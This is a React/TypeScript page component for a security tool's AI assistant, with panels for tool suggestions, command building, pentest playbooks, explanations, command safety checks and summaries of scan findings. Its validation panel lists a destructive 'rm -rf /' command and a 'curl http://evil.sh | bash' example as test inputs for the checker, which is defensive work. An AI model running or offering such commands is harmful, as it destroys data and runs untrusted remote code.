/**
 * CyberSec Pro AI Assistant — Intelligent Security Co-Pilot
 *
 * Five capabilities:
 *   1. Tool Suggester    — "What should I use for X?"
 *   2. Command Builder   — Build a safe command for a tool/target
 *   3. Playbook          — Multi-step workflow (recon → exploit → report)
 *   4. Explain           — Plain-English explanation of any tool / command
 *   5. Validate          — Static safety analysis of a command
 *   6. Interpret         — Summarize scan findings (paste JSON or pull from scan)
 */
import { useState } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { useTranslation } from 'react-i18next';
import { useDocumentTitle } from '../../hooks/useUtilities';
import { PageTransition } from '../../components/ui';
import {
  useAISuggestTools,
  useAIGenerateCommand,
  useAIPlaybook,
  useAIExplain,
  useAIValidateCommand,
  useAIInterpretResults,
} from '../../hooks/useApiQueries';

// ───── Types ─────
type Tab = 'suggest' | 'command' | 'playbook' | 'explain' | 'validate' | 'interpret';

interface ToolSuggestion {
  id: string;
  name: string;
  category: string;
  target_types: string[];
  use_cases: string[];
  example_command: string;
  danger_level: number;
}

interface SafetyResult {
  command: string;
  safe: boolean;
  warnings: Array<{ pattern: string; reason: string; severity: string }>;
  verdict: 'ok' | 'review' | 'blocked';
}

const TABS: Array<{ id: Tab; label: string; icon: string; desc: string }> = [
  { id: 'suggest',   label: 'Suggest Tools', icon: '🎯', desc: 'Which tool fits my goal?' },
  { id: 'playbook',  label: 'Playbook',      icon: '📋', desc: 'Multi-step workflow' },
  { id: 'command',   label: 'Build Command', icon: '⚡', desc: 'Safe command for target' },
  { id: 'explain',   label: 'Explain',       icon: '💡', desc: 'How does this work?' },
  { id: 'validate',  label: 'Validate',      icon: '🛡️', desc: 'Safety check a command' },
  { id: 'interpret', label: 'Interpret',     icon: '📊', desc: 'Summarize findings' },
];

const DANGER_BADGE: Record<number, { label: string; color: string }> = {
  0: { label: 'Safe', color: 'bg-green-500/20 text-green-400 border-green-500/30' },
  1: { label: 'Intrusive', color: 'bg-yellow-500/20 text-yellow-400 border-yellow-500/30' },
  2: { label: 'Destructive', color: 'bg-red-500/20 text-red-400 border-red-500/30' },
};

const VERDICT_BADGE: Record<string, { label: string; color: string; icon: string }> = {
  ok:      { label: 'Safe to run',    color: 'bg-green-500/20 text-green-400',  icon: '✓' },
  review:  { label: 'Review needed',  color: 'bg-yellow-500/20 text-yellow-400', icon: '⚠' },
  blocked: { label: 'Blocked',        color: 'bg-red-500/20 text-red-400',      icon: '⛔' },
};

export default function AIAssistantPage() {
  const { t } = useTranslation();
  useDocumentTitle(`${t('aiAssistant.title', 'AI Assistant')} — CyberSec Pro`);

  const [tab, setTab] = useState<Tab>('suggest');
  const [useLLM, setUseLLM] = useState(true);

  return (
    <PageTransition>
      <div className="p-6 space-y-6 max-w-7xl mx-auto">
        {/* Header */}
        <div className="flex items-start justify-between gap-4 flex-wrap">
          <div>
            <h1 className="text-3xl font-bold text-white flex items-center gap-3">
              <span className="text-4xl">🤖</span>
              CyberSec Pro AI
              <span className="px-2 py-0.5 text-xs font-semibold bg-cyan-500/20 text-cyan-400 rounded-full border border-cyan-500/30">
                Intelligent Co-Pilot
              </span>
            </h1>
            <p className="text-gray-400 mt-2 max-w-2xl">
              Your security expert. Ask what tool to use, build safe commands, design multi-step
              playbooks, validate dangerous commands, and let AI interpret your scan findings.
            </p>
          </div>
          <label className="flex items-center gap-2 px-3 py-2 bg-gray-800 border border-gray-700 rounded-lg text-sm cursor-pointer hover:border-cyan-500 transition">
            <input type="checkbox" checked={useLLM} onChange={e => setUseLLM(e.target.checked)} className="w-4 h-4 accent-cyan-500" />
            <span className="text-gray-300">LLM enrichment</span>
            <span className="text-xs text-gray-500">(slower, smarter)</span>
          </label>
        </div>

        {/* Tabs */}
        <div className="flex flex-wrap gap-2">
          {TABS.map(tabItem => (
            <button
              key={tabItem.id}
              onClick={() => setTab(tabItem.id)}
              className={`group relative px-4 py-3 rounded-xl border transition-all ${
                tab === tabItem.id
                  ? 'bg-cyan-500/10 border-cyan-500/50 text-cyan-300'
                  : 'bg-gray-800/50 border-gray-700 text-gray-400 hover:border-gray-600 hover:text-gray-200'
              }`}
            >
              <div className="flex items-center gap-2">
                <span className="text-lg">{tabItem.icon}</span>
                <div className="text-left">
                  <div className="font-medium text-sm">{tabItem.label}</div>
                  <div className="text-xs opacity-70">{tabItem.desc}</div>
                </div>
              </div>
            </button>
          ))}
        </div>

        {/* Active panel */}
        <div className="bg-gray-800/40 border border-gray-700 rounded-2xl p-6 min-h-[400px]">
          <AnimatePresence mode="wait">
            <motion.div key={tab} initial={{ opacity: 0, y: 8 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0 }} transition={{ duration: 0.2 }}>
              {tab === 'suggest'   && <SuggestPanel useLLM={useLLM} />}
              {tab === 'command'   && <CommandPanel useLLM={useLLM} />}
              {tab === 'playbook'  && <PlaybookPanel useLLM={useLLM} />}
              {tab === 'explain'   && <ExplainPanel useLLM={useLLM} />}
              {tab === 'validate'  && <ValidatePanel />}
              {tab === 'interpret' && <InterpretPanel useLLM={useLLM} />}
            </motion.div>
          </AnimatePresence>
        </div>
      </div>
    </PageTransition>
  );
}

// ═══════════════════════════════════════════════════════════
// Panel: Suggest Tools
// ═══════════════════════════════════════════════════════════
function SuggestPanel({ useLLM }: { useLLM: boolean }) {
  const [query, setQuery] = useState('');
  const [targetType, setTargetType] = useState<string>('');
  const mut = useAISuggestTools();
  const result = mut.data as { suggestions?: ToolSuggestion[]; explanation?: string; source?: string } | undefined;

  const examples = [
    'I want to scan a WordPress site',
    'Find subdomains for bug bounty',
    'Test SSL configuration',
    'Check Docker image for CVEs',
    'Brute force SSH login',
    'Find leaked secrets in git repo',
  ];

  const submit = () => {
    if (!query.trim()) return;
    mut.mutate({ query: query.trim(), target_type: targetType || undefined, use_llm: useLLM });
  };

  return (
    <div className="space-y-4">
      <div>
        <label className="block text-sm text-gray-300 mb-2">What do you want to do?</label>
        <textarea
          value={query}
          onChange={e => setQuery(e.target.value)}
          onKeyDown={e => e.key === 'Enter' && e.ctrlKey && submit()}
          placeholder="e.g. I want to find SQL injection vulnerabilities in a login form..."
          rows={3}
          className="w-full px-4 py-3 bg-gray-900 border border-gray-700 rounded-lg text-white text-sm focus:outline-none focus:border-cyan-500 resize-none"
        />
      </div>

      <div className="flex flex-wrap items-end gap-3">
        <div>
          <label className="block text-xs text-gray-400 mb-1">Target type (optional)</label>
          <select value={targetType} onChange={e => setTargetType(e.target.value)} className="px-3 py-2 bg-gray-900 border border-gray-700 rounded-lg text-sm text-gray-200">
            <option value="">Any</option>
            <option value="url">URL</option>
            <option value="domain">Domain</option>
            <option value="ip">IP / CIDR</option>
            <option value="repository">Git repo</option>
            <option value="image">Container image</option>
            <option value="file">File</option>
          </select>
        </div>
        <button
          onClick={submit}
          disabled={mut.isPending || !query.trim()}
          className="px-5 py-2 bg-cyan-600 hover:bg-cyan-500 disabled:bg-gray-700 text-white rounded-lg font-medium text-sm transition"
        >
          {mut.isPending ? 'Thinking…' : '🎯 Suggest Tools'}
        </button>
        <span className="text-xs text-gray-500">Ctrl+Enter to submit</span>
      </div>

      <div className="flex flex-wrap gap-2">
        {examples.map(ex => (
          <button key={ex} onClick={() => setQuery(ex)} className="px-2.5 py-1 text-xs bg-gray-800 hover:bg-gray-700 border border-gray-700 rounded-full text-gray-400">
            {ex}
          </button>
        ))}
      </div>

      {result?.explanation && (
        <div className="p-4 bg-cyan-500/5 border border-cyan-500/20 rounded-lg">
          <div className="text-xs text-cyan-400 mb-1 font-semibold uppercase">AI Analysis ({result.source})</div>
          <p className="text-gray-300 text-sm leading-relaxed">{result.explanation}</p>
        </div>
      )}

      {result?.suggestions && result.suggestions.length > 0 ? (
        <div className="grid md:grid-cols-2 gap-3 mt-4">
          {result.suggestions.map(tool => (
            <div key={tool.id} className="p-4 bg-gray-900/60 border border-gray-700 rounded-lg hover:border-cyan-500/50 transition">
              <div className="flex items-start justify-between gap-2 mb-2">
                <div>
                  <div className="font-bold text-white">{tool.name}</div>
                  <div className="text-xs text-gray-500">{tool.category}</div>
                </div>
                <span className={`px-2 py-0.5 text-xs rounded border ${DANGER_BADGE[tool.danger_level]?.color}`}>
                  {DANGER_BADGE[tool.danger_level]?.label}
                </span>
              </div>
              <div className="text-xs text-gray-400 mb-2">
                <span className="text-gray-500">Best for:</span> {tool.use_cases.slice(0, 3).join(' • ')}
              </div>
              <div className="text-xs text-gray-500 mb-1">Example:</div>
              <code className="block text-xs bg-gray-950 text-green-400 px-2 py-1.5 rounded border border-gray-800 overflow-x-auto whitespace-nowrap">
                {tool.example_command}
              </code>
              <div className="flex gap-1 mt-2 flex-wrap">
                {tool.target_types.map(tt => (
                  <span key={tt} className="px-1.5 py-0.5 text-[10px] bg-gray-800 text-gray-400 rounded">{tt}</span>
                ))}
              </div>
            </div>
          ))}
        </div>
      ) : mut.isSuccess ? (
        <p className="text-gray-500 text-sm italic mt-4">No matching tools — try rephrasing your goal.</p>
      ) : null}
    </div>
  );
}

// ═══════════════════════════════════════════════════════════
// Panel: Command Builder
// ═══════════════════════════════════════════════════════════
function CommandPanel({ useLLM: _ }: { useLLM: boolean }) {
  const [toolId, setToolId] = useState('nmap');
  const [target, setTarget] = useState('');
  const mut = useAIGenerateCommand();
  const r = mut.data as { command?: string; safety?: SafetyResult; tool?: ToolSuggestion } | undefined;

  const TOOL_OPTIONS = [
    'nmap','masscan','nikto','nuclei','wpscan','sqlmap','gobuster','ffuf','subfinder',
    'amass','httpx','sslscan','testssl','hydra','metasploit','zap','trivy','gitleaks','trufflehog',
  ];

  return (
    <div className="space-y-4">
      <div className="grid md:grid-cols-2 gap-3">
        <div>
          <label className="block text-sm text-gray-300 mb-1">Tool</label>
          <select value={toolId} onChange={e => setToolId(e.target.value)} className="w-full px-3 py-2 bg-gray-900 border border-gray-700 rounded-lg text-sm text-gray-200">
            {TOOL_OPTIONS.map(t => <option key={t} value={t}>{t}</option>)}
          </select>
        </div>
        <div>
          <label className="block text-sm text-gray-300 mb-1">Target</label>
          <input value={target} onChange={e => setTarget(e.target.value)} placeholder="example.com or 192.168.1.0/24"
            className="w-full px-3 py-2 bg-gray-900 border border-gray-700 rounded-lg text-sm text-gray-200" />
        </div>
      </div>
      <button
        disabled={!target.trim() || mut.isPending}
        onClick={() => mut.mutate({ tool_id: toolId, target: target.trim() })}
        className="px-5 py-2 bg-cyan-600 hover:bg-cyan-500 disabled:bg-gray-700 text-white rounded-lg font-medium text-sm"
      >
        {mut.isPending ? 'Building…' : '⚡ Build Command'}
      </button>

      {r?.command && (
        <div className="space-y-3">
          <div>
            <div className="text-xs text-gray-400 mb-1">Generated command:</div>
            <code className="block text-sm bg-gray-950 text-green-400 px-3 py-2 rounded border border-gray-800 overflow-x-auto">
              {r.command}
            </code>
          </div>
          {r.safety && <SafetyCard safety={r.safety} />}
        </div>
      )}
    </div>
  );
}

// ═══════════════════════════════════════════════════════════
// Panel: Playbook
// ═══════════════════════════════════════════════════════════
function PlaybookPanel({ useLLM }: { useLLM: boolean }) {
  const [goal, setGoal] = useState('');
  const [target, setTarget] = useState('');
  const mut = useAIPlaybook();
  const r = mut.data as { steps?: Array<{ order: number; tool: string; purpose: string; command: string }>; rationale?: string } | undefined;

  const presets = ['Bug bounty recon', 'WordPress audit', 'Internal network pentest', 'SSL/TLS audit', 'API security test', 'Find leaked secrets'];

  return (
    <div className="space-y-4">
      <div className="grid md:grid-cols-2 gap-3">
        <div>
          <label className="block text-sm text-gray-300 mb-1">Goal</label>
          <input value={goal} onChange={e => setGoal(e.target.value)} placeholder="e.g. Bug bounty recon"
            className="w-full px-3 py-2 bg-gray-900 border border-gray-700 rounded-lg text-sm text-gray-200" />
        </div>
        <div>
          <label className="block text-sm text-gray-300 mb-1">Target</label>
          <input value={target} onChange={e => setTarget(e.target.value)} placeholder="example.com"
            className="w-full px-3 py-2 bg-gray-900 border border-gray-700 rounded-lg text-sm text-gray-200" />
        </div>
      </div>
      <div className="flex flex-wrap gap-2">
        {presets.map(p => (
          <button key={p} onClick={() => setGoal(p)} className="px-2.5 py-1 text-xs bg-gray-800 hover:bg-gray-700 border border-gray-700 rounded-full text-gray-400">{p}</button>
        ))}
      </div>
      <button
        disabled={!goal.trim() || !target.trim() || mut.isPending}
        onClick={() => mut.mutate({ goal: goal.trim(), target: target.trim(), use_llm: useLLM })}
        className="px-5 py-2 bg-cyan-600 hover:bg-cyan-500 disabled:bg-gray-700 text-white rounded-lg font-medium text-sm"
      >
        {mut.isPending ? 'Designing…' : '📋 Generate Playbook'}
      </button>

      {r?.rationale && (
        <div className="p-3 bg-cyan-500/5 border border-cyan-500/20 rounded-lg">
          <div className="text-xs text-cyan-400 font-semibold uppercase mb-1">Why this order</div>
          <p className="text-sm text-gray-300">{r.rationale}</p>
        </div>
      )}

      {r?.steps && r.steps.length > 0 && (
        <ol className="space-y-2">
          {r.steps.map(step => (
            <li key={step.order} className="p-3 bg-gray-900/60 border border-gray-700 rounded-lg flex gap-3">
              <div className="flex-shrink-0 w-8 h-8 bg-cyan-500/20 text-cyan-400 rounded-full flex items-center justify-center font-bold">{step.order}</div>
              <div className="flex-1 min-w-0">
                <div className="flex items-baseline justify-between gap-2">
                  <span className="font-semibold text-white">{step.tool}</span>
                  <span className="text-xs text-gray-500">{step.purpose}</span>
                </div>
                <code className="block mt-1 text-xs bg-gray-950 text-green-400 px-2 py-1 rounded overflow-x-auto whitespace-nowrap">{step.command}</code>
              </div>
            </li>
          ))}
        </ol>
      )}
    </div>
  );
}

// ═══════════════════════════════════════════════════════════
// Panel: Explain
// ═══════════════════════════════════════════════════════════
function ExplainPanel({ useLLM }: { useLLM: boolean }) {
  const [mode, setMode] = useState<'tool' | 'command'>('tool');
  const [val, setVal] = useState('');
  const mut = useAIExplain();
  const r = mut.data as { summary?: string; explanation?: string; deep_explanation?: string; tool?: ToolSuggestion; safety?: SafetyResult } | undefined;

  const submit = () => {
    if (!val.trim()) return;
    mut.mutate(mode === 'tool' ? { tool_id: val.trim(), use_llm: useLLM } : { command: val.trim(), use_llm: useLLM });
  };

  return (
    <div className="space-y-4">
      <div className="flex gap-2">
        <button onClick={() => setMode('tool')} className={`px-3 py-1.5 rounded-lg text-sm ${mode === 'tool' ? 'bg-cyan-500/20 text-cyan-300' : 'bg-gray-800 text-gray-400'}`}>Tool</button>
        <button onClick={() => setMode('command')} className={`px-3 py-1.5 rounded-lg text-sm ${mode === 'command' ? 'bg-cyan-500/20 text-cyan-300' : 'bg-gray-800 text-gray-400'}`}>Command</button>
      </div>
      <input
        value={val}
        onChange={e => setVal(e.target.value)}
        onKeyDown={e => e.key === 'Enter' && submit()}
        placeholder={mode === 'tool' ? 'e.g. nmap, sqlmap, nuclei…' : 'e.g. nmap -sV -A scanme.nmap.org'}
        className="w-full px-3 py-2 bg-gray-900 border border-gray-700 rounded-lg text-sm text-gray-200 font-mono"
      />
      <button
        disabled={!val.trim() || mut.isPending}
        onClick={submit}
        className="px-5 py-2 bg-cyan-600 hover:bg-cyan-500 disabled:bg-gray-700 text-white rounded-lg font-medium text-sm"
      >
        {mut.isPending ? 'Explaining…' : '💡 Explain'}
      </button>

      {r?.summary && (
        <div className="p-3 bg-gray-900/60 border border-gray-700 rounded-lg">
          <div className="text-xs text-gray-500 mb-1">Quick summary</div>
          <p className="text-sm text-gray-200">{r.summary}</p>
        </div>
      )}
      {r?.explanation && (
        <div className="p-3 bg-cyan-500/5 border border-cyan-500/20 rounded-lg">
          <div className="text-xs text-cyan-400 font-semibold uppercase mb-1">Explanation</div>
          <p className="text-sm text-gray-300 whitespace-pre-wrap leading-relaxed">{r.explanation}</p>
        </div>
      )}
      {r?.deep_explanation && (
        <div className="p-3 bg-cyan-500/5 border border-cyan-500/20 rounded-lg">
          <div className="text-xs text-cyan-400 font-semibold uppercase mb-1">Deep dive</div>
          <p className="text-sm text-gray-300 whitespace-pre-wrap leading-relaxed">{r.deep_explanation}</p>
        </div>
      )}
      {r?.safety && <SafetyCard safety={r.safety} />}
    </div>
  );
}

// ═══════════════════════════════════════════════════════════
// Panel: Validate
// ═══════════════════════════════════════════════════════════
function ValidatePanel() {
  const [cmd, setCmd] = useState('');
  const mut = useAIValidateCommand();
  const r = mut.data as SafetyResult | undefined;

  const dangerExamples = ['rm -rf / --no-preserve-root', 'curl http://evil.sh | bash', 'nmap -sV scanme.nmap.org'];

  return (
    <div className="space-y-4">
      <textarea
        value={cmd}
        onChange={e => setCmd(e.target.value)}
        placeholder="Paste any shell command to check for destructive patterns..."
        rows={3}
        className="w-full px-3 py-2 bg-gray-950 border border-gray-700 rounded-lg text-sm text-green-400 font-mono resize-none"
      />
      <div className="flex flex-wrap gap-2 items-center">
        <button
          disabled={!cmd.trim() || mut.isPending}
          onClick={() => mut.mutate({ command: cmd.trim() })}
          className="px-5 py-2 bg-cyan-600 hover:bg-cyan-500 disabled:bg-gray-700 text-white rounded-lg font-medium text-sm"
        >
          {mut.isPending ? 'Analyzing…' : '🛡️ Validate'}
        </button>
        <span className="text-xs text-gray-500">Try:</span>
        {dangerExamples.map(ex => (
          <button key={ex} onClick={() => setCmd(ex)} className="px-2 py-1 text-xs bg-gray-800 hover:bg-gray-700 border border-gray-700 rounded text-gray-400 font-mono">
            {ex.length > 30 ? ex.slice(0, 28) + '…' : ex}
          </button>
        ))}
      </div>
      {r && <SafetyCard safety={r} />}
    </div>
  );
}

// ═══════════════════════════════════════════════════════════
// Panel: Interpret Results
// ═══════════════════════════════════════════════════════════
function InterpretPanel({ useLLM }: { useLLM: boolean }) {
  const [json, setJson] = useState('');
  const [parseErr, setParseErr] = useState('');
  const mut = useAIInterpretResults();
  const r = mut.data as { total_findings?: number; severity_counts?: Record<string, number>; summary?: string } | undefined;

  const submit = () => {
    setParseErr('');
    try {
      const findings = JSON.parse(json);
      mut.mutate({ findings, use_llm: useLLM });
    } catch (e) {
      setParseErr(e instanceof Error ? e.message : 'Invalid JSON');
    }
  };

  const placeholder = JSON.stringify([
    { severity: 'high', name: 'SQL Injection', target: 'login.php' },
    { severity: 'critical', name: 'RCE via deserialization', target: '/api/import' },
  ], null, 2);

  return (
    <div className="space-y-4">
      <textarea
        value={json}
        onChange={e => setJson(e.target.value)}
        placeholder={`Paste findings JSON array, e.g.\n${placeholder}`}
        rows={10}
        className="w-full px-3 py-2 bg-gray-950 border border-gray-700 rounded-lg text-xs text-gray-200 font-mono resize-y"
      />
      {parseErr && <div className="text-xs text-red-400">⛔ {parseErr}</div>}
      <button
        disabled={!json.trim() || mut.isPending}
        onClick={submit}
        className="px-5 py-2 bg-cyan-600 hover:bg-cyan-500 disabled:bg-gray-700 text-white rounded-lg font-medium text-sm"
      >
        {mut.isPending ? 'Analyzing…' : '📊 Interpret'}
      </button>

      {r && (
        <div className="space-y-3">
          <div className="grid grid-cols-2 md:grid-cols-5 gap-2">
            <div className="p-3 bg-gray-900/60 border border-gray-700 rounded-lg">
              <div className="text-xs text-gray-500">Total</div>
              <div className="text-2xl font-bold text-white">{r.total_findings ?? 0}</div>
            </div>
            {r.severity_counts && Object.entries(r.severity_counts).map(([sev, count]) => (
              <div key={sev} className="p-3 bg-gray-900/60 border border-gray-700 rounded-lg">
                <div className="text-xs text-gray-500 capitalize">{sev}</div>
                <div className={`text-2xl font-bold ${
                  sev === 'critical' ? 'text-red-400' :
                  sev === 'high' ? 'text-orange-400' :
                  sev === 'medium' ? 'text-yellow-400' :
                  sev === 'low' ? 'text-blue-400' : 'text-gray-400'
                }`}>{count}</div>
              </div>
            ))}
          </div>
          {r.summary && (
            <div className="p-4 bg-cyan-500/5 border border-cyan-500/20 rounded-lg">
              <div className="text-xs text-cyan-400 font-semibold uppercase mb-1">Analyst Summary</div>
              <p className="text-sm text-gray-300 whitespace-pre-wrap leading-relaxed">{r.summary}</p>
            </div>
          )}
        </div>
      )}
    </div>
  );
}

// ═══════════════════════════════════════════════════════════
// Shared: Safety card
// ═══════════════════════════════════════════════════════════
function SafetyCard({ safety }: { safety: SafetyResult }) {
  const v = VERDICT_BADGE[safety.verdict] ?? VERDICT_BADGE.review;
  return (
    <div className={`p-3 rounded-lg border ${
      safety.verdict === 'ok' ? 'bg-green-500/5 border-green-500/30' :
      safety.verdict === 'review' ? 'bg-yellow-500/5 border-yellow-500/30' :
      'bg-red-500/5 border-red-500/30'
    }`}>
      <div className="flex items-center gap-2 mb-2">
        <span className={`px-2 py-0.5 text-xs rounded ${v.color} font-semibold`}>
          {v.icon} {v.label}
        </span>
        {safety.warnings.length > 0 && <span className="text-xs text-gray-500">{safety.warnings.length} warning(s)</span>}
      </div>
      {safety.warnings.length > 0 && (
        <ul className="space-y-1 text-xs">
          {safety.warnings.map((w, i) => (
            <li key={i} className="flex gap-2">
              <span className={w.severity === 'critical' ? 'text-red-400' : 'text-yellow-400'}>●</span>
              <span className="text-gray-400"><code className="bg-gray-950 px-1 rounded">{w.pattern}</code> — {w.reason}</span>
            </li>
          ))}
        </ul>
      )}
    </div>
  );
}
